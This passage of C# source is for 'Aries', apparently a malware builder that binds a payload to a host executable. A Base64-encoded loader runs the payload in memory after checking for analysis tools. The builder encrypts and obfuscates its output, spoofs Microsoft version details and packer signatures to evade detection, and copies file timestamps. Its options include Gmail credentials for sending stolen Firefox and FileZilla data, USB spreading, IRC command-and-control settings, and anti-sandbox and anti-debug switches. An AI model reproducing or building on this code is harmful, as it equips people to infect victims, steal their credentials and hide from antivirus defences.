/*
Copyright (c) 2011 EAX

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using System.Security.Cryptography;
using System.Net.Mail;

namespace Aries
{
    sealed partial class Form1 : Form
    {

        #region Singleton
        static Form1 _Instance = null;
        static readonly object PadLock = new object();

        public static Form1 Instance
        {
            get
            {
                lock (PadLock)
                {
                    if (_Instance == null)
                    {
                        _Instance = new Form1();
                    }
                    return _Instance;
                }
            }
        }
        #endregion

        public Form1()
        {
            InitializeComponent();
        }

        private void btnChooseFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog opendialog = new OpenFileDialog();
            opendialog.DefaultExt = ".exe";
            opendialog.Filter = "exe files (*.exe)|*.exe";
            opendialog.Title = "Choose File...";
            opendialog.FileName = String.Empty;

            if (opendialog.ShowDialog() == DialogResult.Cancel) { return; }
            if (opendialog.FileName == null) { return; }

            if (!opendialog.FileName.ToLower().EndsWith(".exe") || !File.Exists(opendialog.FileName))
            { MessageBox.Show("Must be an executable file"); return; }

            Instance.TextHostFile.Text = opendialog.FileName;
            opendialog.Dispose();
        }


        private void btnBindFiles_Click(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            if (!PrepareForBind())
                return;
            new Thread(BindFiles).Start();
        }

        /// <summary>
        /// Convert a Base64 string
        /// </summary>
        /// <param name="input">Base64 string</param>
        private string FromBase64(string input)
        {
            return Encoding.Default.GetString(Convert.FromBase64String(input));
        }

        /// <summary>
        /// Bind the files, apply settings
        /// </summary>
        private void BindFiles()
        {

            SetFileInfo(); //Set the variables which will be appended after binding
            Instance.DebugLBL1.Text += (Path.GetFileName(Instance.TextHostFile.Text) + " - " +
                CodeDOMCompiler.SetBytes(Encoding.Default.GetBytes(Instance.TextHostFile.Text), true) + '\n');
            IconMethods.IconClass.ExtractIcon();

            string resName = Util.getRandNum(new Random().Next(8, 20));
            //string ResourceFile = FromBase64(Properties.Resources.Loader);

            //Base64 of the loader to decompress & run the stub
            string ResourceFile = FromBase64("dXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uSU8uQ29tcHJlc3Npb247DQp1c2luZyBTeXN0ZW0uSU87DQp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsNCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7DQp1c2luZyBTeXN0ZW0uVGV4dDsNCnVzaW5nIFN5c3RlbTsNCg0KW2Fzc2VtYmx5OiBBc3NlbWJseVZlcnNpb24oIjUuMS4yNjAwLjAiKV0NClthc3NlbWJseTogQXNzZW1ibHlUcmFkZW1hcmsoIk1pY3Jvc29mdCBDb3Jwb3JhdGlvbiIpXQ0KW2Fzc2VtYmx5OiBBc3NlbWJseUNvcHlyaWdodCgiQ29weXJpZ2h0IFx4MDBhOSBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuIildDQpbYXNzZW1ibHk6IEFzc2VtYmx5UHJvZHVjdCgiTWljcm9zb2Z0IFdpbmRvd3MgT3BlcmF0aW5nIFN5c3RlbSIpXQ0KW2Fzc2VtYmx5OiBBc3NlbWJseUNvbXBhbnkoIk1pY3Jvc29mdCBDb3Jwb3JhdGlvbiIpXQ0KW2Fzc2VtYmx5OiBBc3NlbWJseURlc2NyaXB0aW9uKCJNaWNyb3NvZnQgQ29ycG9yYXRpb24iKV0NClthc3NlbWJseTogQXNzZW1ibHlUaXRsZSgiTWljcm9zb2Z0IENvcnBvcmF0aW9uIildDQpbYXNzZW1ibHk6IEFzc2VtYmx5RmlsZVZlcnNpb24oIjUuMS4yNjAwLjAiKV0NClthc3NlbWJseTogU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcy5TdXBwcmVzc0lsZGFzbV0NCg0KDQpuYW1lc3BhY2UgWA0Kew0KCWludGVybmFsIHN0YXRpYyBjbGFzcyBMDQoJew0KCQlwcml2YXRlIHN0YXRpYyBBc3NlbWJseSBBID0gbnVsbDsNCgkJLy9wcml2YXRlIHN0YXRpYyBvYmplY3RbXSBCID0gbnVsbDsNCgkJcHJpdmF0ZSBzdGF0aWMgTWV0aG9kSW5mbyBDID0gbnVsbDsNCgkJcHJpdmF0ZSBzdGF0aWMgb2JqZWN0IEQgPSBudWxsOw0KDQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7DQoNCgkJcHJpdmF0ZSBzdGF0aWMgdm9pZCBNYWluKCkvLyhzdHJpbmdbXSBhcmdzKQ0KCQl7DQoJCXN0YXJ0KCk7Ly9hcmdzDQoJCX0NCgkJDQoJCXByaXZhdGUgc3RhdGljIGJvb2wgc3RhcnQoKS8vKHN0cmluZ1tdIGFyZ3MpDQoJCXsNCgkJDQogICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgIGlmICgoR2V0TW9kdWxlSGFuZGxlKCJTbmlmZmVyMkhlbHBlcldpbjMyLmRsbCIpLlRvSW50MzIoKSAhPSAwKSB8fCBjaGVja3Byb2MoIi5ORVQgR2VuZXJpYyBVbnBhY2tlciIpIHx8DQogICAgICBjaGVja3Byb2MoIlB2TG9nIC5ORVQgU25pZmZlciIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGdvdG8gTGFiZWxfMDE7DQogICAgICAgICAgICAgICAgLy9FbnZpcm9ubWVudC5GYWlsRmFzdChuZXcgUmFuZG9tKCkuTmV4dCgyMDApLlRvU3RyaW5nKCkpOw0KICAgICAgICAgICAgfSANCiAgICAgICAgICAgIGlmIChTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzLlN1cHByZXNzSWxkYXNtQXR0cmlidXRlLkdldEN1c3RvbUF0dHJpYnV0ZShBc3NlbWJseS5HZXRFeGVjdXRpbmdBc3NlbWJseSgpLCB0eXBlb2YoU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcy5TdXBwcmVzc0lsZGFzbUF0dHJpYnV0ZSkpID09IG51bGwpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZ290byBMYWJlbF8wMTsNCiAgICAgICAgICAgICAgICAvL0Vudmlyb25tZW50LkZhaWxGYXN0KG5ldyBSYW5kb20oKS5OZXh0KDIwMCkuVG9TdHJpbmcoKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgLy9BRSBhZSA9IG5ldyBBRSgpOw0KICAgICAgICAgICAgICAgIHN0cmluZyB4ID0gIm90bnYiOw0KICAgICAgICAgICAgICAgIHN0cmluZyBmaWxlID0gTWljcm9zb2Z0LlZpc3VhbEJhc2ljLlN0cmluZ3MuU3BsaXQoRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoRSgiRGF0YS5yZXNvdXJjZXMiKSksICIhQF8hIiwgLTEsIE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21wYXJlTWV0aG9kLlRleHQpWzBdOw0KICAgICAgICAgICAgICAgLy8gYnl0ZVtdIENDID0gRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhhZS5ERShFbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGZpbGUpKSk7DQogICAgICAgICAgICAgICAgYnl0ZVtdIENDID0gRihFbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGZpbGUpKTsNCiAgICAgICAgICAgICAgICBBID0gQXNzZW1ibHkuTG9hZCgoQ0MpKTsNCiAgICAgICAgICAgICAgICBDID0gQS5FbnRyeVBvaW50Ow0KICAgICAgICAgICAgICAgIC8vaWYgKEMuR2V0UGFyYW1ldGVycygpLkxlbmd0aCA+IDApDQogICAgICAgICAgICAgICAgLy97DQogICAgICAgICAgICAgICAgICAgLy8gQiA9IG5ldyBvYmplY3RbXSB7IGFyZ3MgfTsNCiAgICAgICAgICAgICAgICAvL30NCiAgICAgICAgICAgICAgICBpZiAoeCA9PSAid2F0IikgLy9KdW5rIGNvZGUsIHRoaXMgd2lsbCBuZXZlciBoYXBwZW4uLi4NCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICBnb3RvIExhYmVsXzAxOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBBID0gbnVsbDsNCiAgICAgICAgICAgICAgICBEID0gQy5JbnZva2UobnVsbCwgbnVsbCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIExhYmVsXzAxOg0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkZhaWxGYXN0KG5ldyBSYW5kb20oKS5OZXh0KDIwMCkuVG9TdHJpbmcoKSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIHgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy9yZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICBNZXNzYWdlQm94LlNob3coeC5Ub1N0cmluZygpICsgIlxuXG5cbiIgKyB4Lk1lc3NhZ2UpOw0KcmV0dXJuIHRydWU7DQoNCiAgICAgICAgICAgIH0NCgkJfQ0KCQkNCg0KCQlwcml2YXRlIHN0YXRpYyBieXRlW10gRShzdHJpbmcgQSkNCgkJew0KCQkJYnl0ZVtdIHRlbXBFID0gbnVsbDsNCgkJCVN5c3RlbS5JTy5TdHJlYW0gQiA9IG51bGw7DQoJCQlCID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5HZXRNYW5pZmVzdFJlc291cmNlU3RyZWFtKEEpOw0KCQkJYnl0ZVtdIGJ5dHMgPSBuZXcgYnl0ZVtTeXN0ZW0uQ29udmVydC5Ub0ludDMyKEIuTGVuZ3RoIC0gMSkgKyAxXTsNCgkJCWludCBzTGVuID0gQi5SZWFkKGJ5dHMsIDAsIFN5c3RlbS5Db252ZXJ0LlRvSW50MzIoQi5MZW5ndGgpKTsNCgkJCVN5c3RlbS5JTy5NZW1vcnlTdHJlYW0gQyA9IG5ldyBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKGJ5dHMsIDAsIHNMZW4pOw0KCQkJdGVtcEUgPSBDLlRvQXJyYXkoKTsNCgkJCUMuQ2xvc2UoKTsNCgkJCUIuQ2xvc2UoKTsNCgkJCXJldHVybiB0ZW1wRTsNCgkJfQ0KDQoNCg0KCQlwdWJsaWMgc3RhdGljIGJ5dGVbXSBGKGJ5dGVbXSBBKQ0KCQl7DQoJCQkvL2NyZWF0ZSBhIE1lbW9yeVN0cmVhbSBmb3IgaG9sZGluZyB0aGUgaW5jb21pbmcgZGF0YQ0KCQkJTWVtb3J5U3RyZWFtIEIgPSBuZXcgTWVtb3J5U3RyZWFtKCk7DQoJCQkvL3dyaXRlIHRoZSBpbmNvbWluZyBieXRlcyB0byB0aGUgTWVtb3J5U3RyZWFtDQoJCQlCLldyaXRlKEEsIDAsIEEuTGVuZ3RoKTsNCgkJCS8vc2V0IG91ciBwb3NpdGlvbiB0byB0aGUgc3RhcnQgb2YgdGhlIFN0cmVhbQ0KCQkJQi5Qb3NpdGlvbiA9IDA7DQoJCQkvL2NyZWF0ZSBhbiBpbnN0YW5jZSBvZiB0aGUgR1ppcFN0cmVhbSB0byBkZWNvbXByZXNzDQoJCQkvL3RoZSBpbmNvbWluZyBieXRlIGFycmF5ICh0aGUgY29tcHJlc3NlZCBWaWV3U3RhdGUpDQoJCQlHWmlwU3RyZWFtIEMgPSBuZXcgR1ppcFN0cmVhbShCLCBDb21wcmVzc2lvbk1vZGUuRGVjb21wcmVzcywgdHJ1ZSk7DQoJCQkvL2NyZWF0ZSBhIG5ldyBNZW1vcnlTdHJlYW0gZm9yIGhvbGRpbmcNCgkJCS8vdGhlIG91dHB1dA0KCQkJTWVtb3J5U3RyZWFtIEQgPSBuZXcgTWVtb3J5U3RyZWFtKCk7DQoJCQkvL2NyZWF0ZSBhIGJ5dGUgYXJyYXkNCgkJCWJ5dGVbXSBFID0gbmV3IGJ5dGVbNjRdOw0KCQkJaW50IEcgPSAtMTsNCgkJCS8vcmVhZCB0aGUgZGVjb21wcmVzc2VkIFZpZXdTdGF0ZSBpbnRvDQoJCQkvL291ciBieXRlIGFycmF5LCBzZXQgdGhhdCB2YWx1ZSB0byBvdXINCgkJCS8vcmVhZCB2YXJpYWJsZSAoaW50IGRhdGEgdHlwZSkNCgkJCUcgPSBDLlJlYWQoRSwgMCwgRS5MZW5ndGgpOw0KCQkJLy9tYWtlIHN1cmUgd2UgaGF2ZSBzb21ldGhpbmcgdG8gcmVhZA0KCQkJd2hpbGUgKEcgPiAwKQ0KCQkJew0KCQkJCS8vd3JpdGUgdGhlIGRlY29tcHJlc3NlZCBieXRlcyB0byBvdXINCgkJCQkvL291dCBnb2luZyBNZW1vcnlTdHJlYW0NCgkJCQlELldyaXRlKEUsIDAsIEcpOw0KCQkJCS8vZ2V0IHRoZSByZXN0IG9mIHRoZSBidWZmZXINCgkJCQlHID0gQy5SZWFkKEUsIDAsIEUuTGVuZ3RoKTsNCgkJCX0NCgkJCUMuQ2xvc2UoKTsNCgkJCS8vcmV0dXJuIG91ciBvdXQgZ29pbmcgTWVtb3J5U3RyZWFtDQoJCQkvL2luIGFuIGFycmF5DQoJCQlyZXR1cm4gRC5Ub0FycmF5KCk7DQoJCX0NCg0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIGJvb2wgY2hlY2twcm9jKHN0cmluZyBmaWxlX25hbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIHAgaW4gU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuR2V0UHJvY2Vzc2VzKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHAuTWFpbldpbmRvd1RpdGxlLkNvbnRhaW5zKGZpbGVfbmFtZSkgfHwgcC5Qcm9jZXNzTmFtZS5Db250YWlucyhmaWxlX25hbWUpKQ0KICAgICAgICAgICAgICAgIHsgcmV0dXJuIHRydWU7IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KCX0NCg0KfSAvL2VuZCBvZiByb290IG5hbWVzcGFjZQ==");

            Thread.Sleep(200);
            //Change the namespace to a random string since it won't be changed with the obfuscator -outdated, nvm
            //namespace X
            ResourceFile = ResourceFile.Replace(FromBase64("bmFtZXNwYWNlIFg="), "namespace " + Util.getRandNum(new Random().Next(8, 20)));

            //Change the assembly's attributes
            if (Instance.checkChangeVersionInfo.Checked)
            {
                ResourceFile = ResourceFile.Replace("AssemblyVersion(\"5.1.2600.0\")", "AssemblyVersion(\"" + Instance.txtProdVer.Text + "\")");
                ResourceFile = ResourceFile.Replace("AssemblyTrademark(\"Microsoft Corporation\")", "AssemblyTrademark(\"" + Instance.txtTrademark.Text + "\")");

                ResourceFile = ResourceFile.Replace("AssemblyCopyright(\"Copyright \\x00a9 Microsoft Corporation. All rights reserved.\")", "AssemblyCopyright(\"" + Instance.txtCopyright.Text + "\")");
                ResourceFile = ResourceFile.Replace("AssemblyProduct(\"Microsoft Windows Operating System\")", "AssemblyProduct(\"" + Instance.txtProdName.Text + "\")");

                ResourceFile = ResourceFile.Replace("AssemblyCompany(\"Microsoft Corporation\")", "AssemblyCompany(\"" + Instance.txtCompany.Text + "\")");
                ResourceFile = ResourceFile.Replace("AssemblyDescription(\"Microsoft Corporation\")", "AssemblyDescription(\"" + Instance.txtDescription.Text + "\")");

                ResourceFile = ResourceFile.Replace("AssemblyTitle(\"Microsoft Corporation\")", "AssemblyTitle(\"" + Instance.txtDescription.Text + "\")");
                ResourceFile = ResourceFile.Replace("AssemblyFileVersion(\"5.1.2600.0\")", "AssemblyFileVersion(\"" + Instance.txtFileVersion.Text + "\")");
            }
            //Stub - 
            Instance.DebugLBL1.Text += (FromBase64("U3R1YiAtIA==") +
                Strings.Mid(Convert.ToString(File.ReadAllBytes("stub.exe").Length / 1024), 1, 4) + " KB\n");

            //icon.ico - 
            if ((Instance.checkmainicon.Checked | Instance.CheckChangeIcon.Checked) & File.Exists("icon.ico"))
                Instance.DebugLBL1.Text += (FromBase64("aWNvbi5pY28gLSA=") +
                    Strings.Mid(Convert.ToString(File.ReadAllBytes("icon.ico").Length / 1024), 1, 4) + " KB\n");

            //Store the stub in a string - fileopen is taken from the first version, should change
            int FileNum = FileSystem.FreeFile();
            FileSystem.FileOpen(FileNum, "stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
            Util.stub = Strings.Space(Convert.ToInt32(FileSystem.LOF(FileNum)));
            FileSystem.FileGet(FileNum, ref Util.stub, -1, false);
            FileSystem.FileClose(FileNum);

            //Store the target file in a string & then reverse it
            Util.file1TargetFileOutput = Encoding.Default.GetString(File.ReadAllBytes(Instance.TextHostFile.Text));
            Util.file1TargetFileOutput = Util.Reverse(Util.file1TargetFileOutput);

            //Compress the file with GZip
            CompressFile();

            if (Instance.CheckEncrypt.Checked)
            {//Encrypt the target file
                Util.file1TargetFileOutput = (Util.AESClass.EncryptToString(Util.file1TargetFileOutput));
                //Target file size after encrypting: 
                Instance.DebugLBL1.Text += FromBase64("VGFyZ2V0IGZpbGUgc2l6ZSBhZnRlciBlbmNyeXB0aW5nOiA=") +
                    CodeDOMCompiler.SetBytes(Encoding.Default.GetBytes(Util.file1TargetFileOutput), false) + '\n';
            }

            //Replace the encryption key from the default so the loader can decrypt the stub
            Util.encryptionkey = Util.AESClass.Key;

            //encryptionkeyhere012345678998765 - default key
            ResourceFile = ResourceFile.Replace(FromBase64("ZW5jcnlwdGlvbmtleWhlcmUwMTIzNDU2Nzg5OTg3NjU="), Encoding.UTF8.GetString(Util.AESClass.Key));

            //Data.resources - default resource file name (where binded stub is stored)
            ResourceFile = ResourceFile.Replace(FromBase64("RGF0YS5yZXNvdXJjZXM="), resName);

            //Concat all the user options
            string fileoptions = Util.FSplit + Util.file1TargetFileOutput +
                "&^*" + Encoding.Default.GetString(Compress.CompressData(Encoding.Default.GetBytes(
                Util.FSplit2 + Util.ErrorTitle +
                Util.FSplit2 + Util.ErrorBody +
                Util.FSplit2 + Util.DisplayInVirtual +
                Util.FSplit2 + Util.DisplayErrorMsg +
                Util.FSplit2 + Util.msgIcon +
                Util.FSplit2 + Util.AntiSandbox +
                Util.FSplit2 + Util.GmailUser +
                Util.FSplit2 + Util.GmailPass +
                Util.FSplit2 + Util.SendFirefoxFilezilla +
                Util.FSplit2 + Util.AntiVirtual +
                Util.FSplit2 + Util.UseRandomNick +
                Util.FSplit2 + Util.ProtectNum +
                Util.FSplit2 +
                Util.FSplit3 + Util.CrashType +
                Util.FSplit3 + Util.AntiSniffDebug +
                Util.FSplit3 + Util.compressed +
                Util.FSplit3 + Util.USBSpread +
                Util.FSplit3 + Util.AntiSysinternals +
                Util.FSplit3 + Instance.TextMutex.Text +
                Util.FSplit3 + Util.EncryptHost +
                Util.FSplit3 + Encoding.Default.GetString(Util.encryptionkey) +
                Util.FSplit3 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.TextServerName.Text)) +
                Util.FSplit3 +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServ.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServPass.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServPort.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServChannel.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServChanPass.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCServMasterUser.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Path.GetFileName(Instance.svdlg.FileName))) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCAuthHost.Text)) +
                Util.FSplit4 + Encoding.Default.GetString(Util.AESClass.Encrypt(Instance.txtIRCLoginPass.Text)) +
                Util.FSplit4)));

            //Compress the stub
            Util.stub = Encoding.Default.GetString(Compress.CompressData(Encoding.Default.GetBytes(Util.stub)));
            string SaveName = Path.GetFileName(Instance.svdlg.FileName);

            //"Stub size after compressing: "
            Instance.DebugLBL1.Text += (FromBase64("U3R1YiBzaXplIGFmdGVyIGNvbXByZXNzaW5nOiA=") +
                Strings.Mid(Convert.ToString(Util.stub.Length / 1024), 1, 4) + FromBase64("IEtC") + '\n'); //" KB"

            byte[] bytarray = new byte[0];
            long length = 0;

            if (Instance.CheckFixFile.Checked)
            {//Fix the file size back to the originals
                if (Instance.checkmainicon.Checked || Instance.CheckChangeIcon.Checked)
                    length = File.ReadAllBytes(Instance.TextHostFile.Text).Length -
                        (Util.stub.Length + fileoptions.Length + File.ReadAllBytes("icon.ico").Length + 10000);
                else
                    length = File.ReadAllBytes(Instance.TextHostFile.Text).Length -
                        (Util.stub.Length + fileoptions.Length + 5120);

                if (length < 0) { length = 0; } //If negative set to 0 bytes
                bytarray = new byte[length];
            }

            if (CheckAddBytes.Checked)
            {//Increase the file size
                if (RadioKB.Checked)
                    bytarray = new byte[bytarray.Length + (Convert.ToInt64(Instance.TextByteAmount.Text) * 1024)];
                else if (RadioMB.Checked)
                    bytarray = new byte[bytarray.Length + (Convert.ToInt64(Instance.TextByteAmount.Text) * 1048576)];
            }
            new Random().NextBytes(bytarray);


            StreamWriter writer2 = new StreamWriter(resName, false, Encoding.Default);
            writer2.AutoFlush = true;
            writer2.Write((Util.stub));
            writer2.Write(fileoptions);
            writer2.Write(Encoding.UTF8.GetString(bytarray));
            writer2.Close();



            ///////////////////////////////////



            if (Instance.checkmainicon.Checked || Instance.CheckChangeIcon.Checked)
                CodeDOMCompiler.Compile(ResourceFile, SaveName, resName, true);
            else
                CodeDOMCompiler.Compile(ResourceFile, SaveName, resName, false);

            //"Compiled file"
            Instance.DebugLBL1.Text += (FromBase64("Q29tcGlsZWQgZmlsZQ==") + '\n');

            while (!File.Exists(SaveName)) { Application.DoEvents(); }

            //"Obfuscating file"
            //Instance.DebugLBL1.Text += (FromBase64("T2JmdXNjYXRpbmcgZmlsZQ==") + '\n');


            {//Obfuscate the file
                //"Obfuscating file"
                Instance.DebugLBL1.Text += (FromBase64("T2JmdXNjYXRpbmcgZmlsZQ==") + '\n');

                string babelName = Util.getRandNum(new Random().Next(5, 15)) + ".exe";

                File.WriteAllBytes(babelName, Properties.Resources.babel);
                File.SetAttributes(babelName, FileAttributes.Hidden | FileAttributes.System);
                while (!File.Exists(babelName))
                    Application.DoEvents();

                System.Diagnostics.ProcessStartInfo info = new System.Diagnostics.ProcessStartInfo();
                info.Arguments = "\"" + SaveName + "\" --iliterations " + new Random().Next(10, 95) +
                    " --virtual --flatns --unicode --msil --deadcode --types --events --methods --properties --fields " +
                    "--invalidopcodes --stringencrypt --output " + SaveName;
                info.FileName = babelName;

                info.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                System.Diagnostics.Process.Start(info);

            Label_0:
                {
                    try
                    {
                        //if (File.Exists(babelName))
                        File.Delete(babelName);
                    }
                    catch { Thread.Sleep(1500); goto Label_0; }
                }

                //"File obfuscated"
                Instance.DebugLBL1.Text += (FromBase64("RmlsZSBvYmZ1c2NhdGVk") + '\n');
            }


            if (Instance.CheckFixFile.Checked)
            {
                Thread.Sleep(2500);
                CodeDOMCompiler.pumpFile(SaveName, Util.OriginalSize);
                //Fixed file size
                Instance.DebugLBL1.Text += (FromBase64("Rml4ZWQgZmlsZSBzaXpl") + '\n');
            }

            /* 0 None
             * 1 PECompact v2.xx
             * 2 NsPacK .Net -> LiuXingPing
             * 3 Themida 1.2.0.1 -> Oreans Technologies
             * 4 Armadillo 4.40 -> Silicon Realms Toolworks
             * 5 UPX 1.03 - 1.04 modified -> Markus & Laszlo
             * 6 ASProtect v1.23 RC4 build 08.07 (exe) -> Alexey Solodovnikov
             */

            if (Instance.comboFakeSign.SelectedIndex > 0)
            {
                Thread.Sleep(2500);
                byte[] file = File.ReadAllBytes(SaveName);
                byte[] signature = new byte[0];

                switch (Instance.comboFakeSign.SelectedIndex)
                {
                    case 1:
                        signature = Signatures.PeCompact2xx;
                        break;
                    case 2:
                        signature = Signatures.NSPack;
                        break;
                    case 3:
                        signature = Signatures.Themida;
                        break;
                    case 4:
                        signature = Signatures.Armadillo440;
                        break;
                    case 5:
                        signature = Signatures.UPX;
                        break;
                    case 6:
                        signature = Signatures.ASProtect;
                        break;
                }

                //This could probably be better implemented...
                //Adds the fake signature after _CorExeMain.mscoree.dll in the assembly to trick PEiD
                for (int i = 0; i < file.Length; i++)
                {
                    if ((file[i] == 0) & (file[i + 1] == 95) & (file[i + 2] == 67))
                    {
                        file[i] = 1;
                        for (int ii = 0; ii < signature.Length; ii++)
                        {
                            file[i + 36 + ii] = signature[ii];
                        }
                        break;
                    }
                }
                StreamWriter write = new StreamWriter(SaveName, false, Encoding.Default);
                write.Write(Encoding.Default.GetString(file));
                write.Flush();
                write.Close();
                file = null;
                //Set fake file signature
                Instance.DebugLBL1.Text += (FromBase64("U2V0IGZha2UgZmlsZSBzaWduYXR1cmU=") + '\n');
            }
            //Final size: 
            Instance.DebugLBL1.Text += (FromBase64("RmluYWwgc2l6ZTog") + CodeDOMCompiler.SetBytes(Encoding.Default.GetBytes(SaveName), true) + '\n');

            //Copy the last access time, last write time, & creation time to the new file
            if (Instance.checkcopyaccess.Checked)
            {
                File.SetLastAccessTime(SaveName, File.GetLastAccessTime(Instance.TextHostFile.Text));
                //Set file last access time to: 
                Instance.DebugLBL1.Text += (FromBase64("U2V0IGZpbGUgbGFzdCBhY2Nlc3MgdGltZSB0bzog") + File.GetLastAccessTime(Instance.TextHostFile.Text).ToString() + '\n');
            }
            if (checkcopywrite.Checked)
            {
                File.SetLastWriteTime(SaveName, File.GetLastWriteTime(Instance.TextHostFile.Text));
                //Set file last write time to: 
                Instance.DebugLBL1.Text += (FromBase64("U2V0IGZpbGUgbGFzdCB3cml0ZSB0aW1lIHRvOiA=") + File.GetLastWriteTime(Instance.TextHostFile.Text).ToString() + '\n');
            }
            if (checkcopycreation.Checked)
            {
                File.SetCreationTime(SaveName, File.GetCreationTime(Instance.TextHostFile.Text));
                //Set file creation time to: 
                Instance.DebugLBL1.Text += (FromBase64("U2V0IGZpbGUgY3JlYXRpb24gdGltZSB0bzog") + File.GetCreationTime(Instance.TextHostFile.Text).ToString() + '\n');
            }

            //Clean up
            if (File.Exists("icon.ico")) { File.Delete("icon.ico"); }
            if (File.Exists("icon.exe")) { File.Delete("icon.exe"); }
            if (File.Exists(resName)) { File.Delete(resName); }
            //File saved to: 
            Instance.DebugLBL1.Text += FromBase64("RmlsZSBzYXZlZCB0bzog") + SaveName + '\n';

            //Task completed at 
            Instance.DebugLBL1.Text += FromBase64("VGFzayBjb21wbGV0ZWQgYXQg") + DateAndTime.Now + '\n';
            GC.Collect();
        }

        /// <summary>
        /// Compress the target file with Compress.CompressData() (GZip)
        /// </summary>
        private void CompressFile()
        {
            bool islarger = false;
            Util.OriginalSize = Util.file1TargetFileOutput.Length;
            string byteSource = Util.file1TargetFileOutput;

            //Compress the target file
            Util.file1TargetFileOutput = Encoding.Default.GetString(
                Compress.CompressData(Encoding.Default.GetBytes(Util.file1TargetFileOutput)));

            Util.PackedSize = Util.file1TargetFileOutput.Length;
            decimal csize = ((decimal)Util.PackedSize / (decimal)Util.OriginalSize) * 100;

            //If it's bigger after compressing, don't use the compressed string & use the original
            if (Convert.ToInt64(Strings.Split(Convert.ToString(csize), ".", -1, CompareMethod.Text)[0]) > 100)
            { islarger = true; }

            if (islarger)
            {
                Util.compressed = false;
                Util.file1TargetFileOutput = byteSource;
                //Skipped file compression on the target file as it would make the file larger than the original
